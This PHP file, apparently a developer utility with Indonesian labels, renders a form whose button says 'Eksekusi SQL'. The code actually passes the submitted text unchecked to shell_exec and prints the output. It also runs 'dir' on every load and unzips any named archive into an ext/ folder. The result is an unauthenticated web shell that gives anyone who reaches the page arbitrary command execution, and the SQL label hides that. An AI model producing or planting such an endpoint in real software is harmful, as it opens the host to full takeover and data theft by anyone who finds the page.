<?php
set_time_limit(0);
#file exec/index.php
?>
<!DOCTYPE html>
<html>
<head>
	<title>Eksekusi</title>
</head>
<body>
<form method="post" action="" enctype="multipart/form-data">
	<table cellpadding="3px" cellspacing="3px" style="padding:5px;">
	<tbody>
		<tr>
			<td><!--input type="file" name="file1" id="file1" /-->
				<textarea id="file2" name="file2" cols="100" rows="10" style="font-size:18px;font-weight:2px;color:red;" /></textarea>
			</td>
		</tr>
		<tr>
			<td>
				<input type="text" id="file3" name="file3" placeholder="nama_file.zip [akan otomatis ter-unzip ke direktori ext]" style="width:90%;font-size:18px;font-weight:2px;color:red;"/>
			</td>
		</tr>
		<tr>
			<td><input type="submit" name="submit" value="Eksekusi SQL" style="border-radius:15px;height:30px;background-color:black;color:white;font-size:18px;;" /></td>
		</tr>
	</tbody>
	</table>
</form>
</body>
</html>
<?php
$result=shell_exec("dir ");
echo $result;
echo "<br/>=================================================<br/>";

if (isset($_POST['submit'])) {
	//$fexec=basename($_FILES['file1']['name']);
	$dirs=$_POST['file2'];
	$dirs3=$_POST['file3'];
	//echo"<script type=\"text/javascript\">document.getElementById(\"file2\").text=\"$dirs\";</script>";

	if(strlen(trim($dirs3))>0){
		$zip=new ZipArchive;
		$res=$zip->open($dirs3);
		if($res==TRUE){
			$zip->extractTo('ext/');
			$zip->close();
			echo"proses unzip sukses";
		}else{
			echo"gagal unzip file";
		}		
	}

	$result=shell_exec($dirs);
	echo "<h3 style=\"text-align:left;\">".$dirs."</h3>";
	echo $result;
}
	echo"<br/>";
	echo"<br/>";
	echo"<br/>";
	echo"#bof auto cabang by nolama<br/>
	UPDATE master AS m SET m.cabang=(SELECT b.kode_cabang FROM master_blok AS b INNER JOIN cabang AS c ON c.cabang=b.kode_cabang WHERE b.kode_blok=LEFT(m.nolama,4));
	<br/>#oef auto cabang by nolama";
?>
